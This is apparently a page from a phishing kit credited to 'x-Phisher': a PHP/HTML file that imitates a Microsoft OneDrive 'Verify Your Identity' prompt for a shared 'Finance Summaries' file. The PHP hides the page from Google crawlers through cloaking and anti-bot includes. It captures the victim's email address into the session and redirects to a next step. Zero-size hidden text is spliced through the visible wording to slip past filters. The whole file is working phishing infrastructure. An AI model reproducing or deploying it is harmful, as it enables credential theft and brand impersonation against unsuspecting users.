<?php
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.com ===========================
*/
session_start();
error_reporting(0);
$path = "../site/";
include('../BOTS/antibots1.php');
include('../BOTS/antibots2.php');
include('../BOTS/antibots3.php');
include('../BOTS/antibots4.php');
include ('../BOTS/authenticator.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { 
    include($path."index.php"); exit();
}
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) {
    include($path."index.php"); exit();
}
if (isset($_POST['e'])) {
    $_SESSION['e'] = $_POST['e'];
    header("Location: ../x/".$_SESSION['authenticator'], true, 303);
}

?>

</script><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<title>OneDrive</title>
	<link rel="stylesheet prefetch" href="https://fonts.googleapis.com/css?family=Open+Sans:600">
	<link rel="stylesheet" href="./files/css.css">
</head>
<body>
	<div class="external-sharing-content ms-Fabric">
		<div class="top-banner">
			<div class="brand-name"><span style="font-family: 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;"><span style="font-size: 0%;">go</span><span style="font-size: 0%;">go</span><span style="font-size: 0%;">go</span><span style="font-size: 0%;">go</span> On<span style="font-size: 0%;">go</span>eD<span style="font-size: 0%;">go</span>riv<span style="font-size: 0%;">go</span>e</span>
			</div>
		</div>
		<div class="main-content">
			<div class="desktop-logo ms-hiddenSm">
				<img class="microsoft-logo" src="./files/logo.png" alt="">
			</div>
			<div class="sharing-form">
				<div class="header">
					<span style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">Verify Your Identity</span>
				</div>
				<div class="form-content">
					<form action="#" method="POST">

						<div class="file-description">
							<div class="file-description-title" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">You've recei<span style="font-size: 0%;">go</span>ved a secure li<span style="font-size: 0%;">go</span>nk to:</div>
							<div class="file-info">
								<img alt="" src="./files/pdf.png" style="height:32px;width:32px;">
								<div class="file-name" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">
									<span>Finance Summaries</span>
								</div>
							</div>
						</div>

						<div>

							<div class="form-message" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;"><span>To open this secu<span style="font-size: 0%;">go</span>re li<span style="font-size: 0%;">go</span>nk, You n<span style="font-size: 0%;">go</span>eed to Ver<span style="font-size: 0%;">go</span>ify that you're<span style="font-size: 0%;">go</span> the intended<span style="font-size: 0%;">go</span> E-mail<span style="font-size: 0%;">go</span> recipient of<span style="font-size: 0%;">go</span> this<span style="font-size: 0%;">go</span> do<span style="font-size: 0%;">go</span>cum<span style="font-size: 0%;">go</span>ent <span style="font-size: 0%;">go</span>.</span>
							</div>
							<div class="form-input-container">

								<input name="e" value="" maxlength="70" class="form-text-input disable-on-submit is-empty " placeholder="Enter Email" type="email" pattern=".{4,30}" oninvalid="this.setCustomValidity('Required Field')" oninput="setCustomValidity('')" title="Required Field" required="">
								<div class="focus-area">
									<i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
									<div class="callout" style="font-family: 'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;">
										<div class="callout-title" style="">Why do I have to do this?</div>
										The per<span style="font-size: 0%;">ygo</span>son that has sha<span style="font-size: 0%;">g3o</span>red this link <span style="font-size: 0%;">y3go</span>with you is shar<span style="font-size: 0%;">go</span>ing with a secure link which requ<span style="font-size: 0%;">go</span>ires you to ver<span style="font-size: 0%;">ygo</span>ify your iden<span style="font-size: 0%;">ygo</span>tity.
									</div>
								</div>
							</div>
							<div class="form-error-container">
								<span style="display:none;">Your <span style="font-size: 0%;">ygo</span>em<span style="font-size: 0%;">yg3o</span>ail add<span style="font-size: 0%;">yg3o</span>ress is requi<span style="font-size: 0%;">ygo</span>red</span>
								<span style="display:none;">Your em<span style="font-size: 0%;">ygo</span>ail addr<span style="font-size: 0%;">yg3o</span>ess must be in the correct em<span style="font-size: 0%;">ygo</span>ail format (e.g. "user@c<span style="font-size: 0%;">ygo</span>ontoso.<span style="font-size: 0%;">ygo</span>com")</span>
								<span id="IncorrectTOAAEMail" style="display:none;">Sorry, this em<span style="font-size: 0%;">yg3o</span>ail is not on the list of people this li<span style="font-size: 0%;">ygo3</span>nk is secu<span style="font-size: 0%;">ygo</span>red to. Please conta<span style="font-size: 0%;">ygo</span>ct the per<span style="font-size: 0%;">go</span>son who sha<span style="font-size: 0%;">go</span>red it with you.</span>
							</div>
							<div class="form-input-container">
								<input name="btnSubmitEmail" value="Next" class="form-submit disable-on-submit" type="submit">
								<div class="submitted-text">
									<div class="spinner"></div>Checking...
								</div>
							</div>

						</div>




				</form></div>
			</div>
			
			<div class="legal">
				<span>© 202<span style="font-size: 0%;">go2</span>1 Mic<span style="font-size: 0%;">g3o</span>ros<span style="font-size: 0%;">g3o</span>oft</span>
				<a href="#">Pr<span style="font-size: 0%;">g2o</span>ivacy &amp; Cook<span style="font-size: 0%;">go3</span>ies</a>
			</div>
			<div class="mobile-logo ms-hiddenMdUp">
				<img class="microsoft-logo" src="./files/logo.png" alt="">
			</div>
		</div>

	</div>





</body></html>
</script>
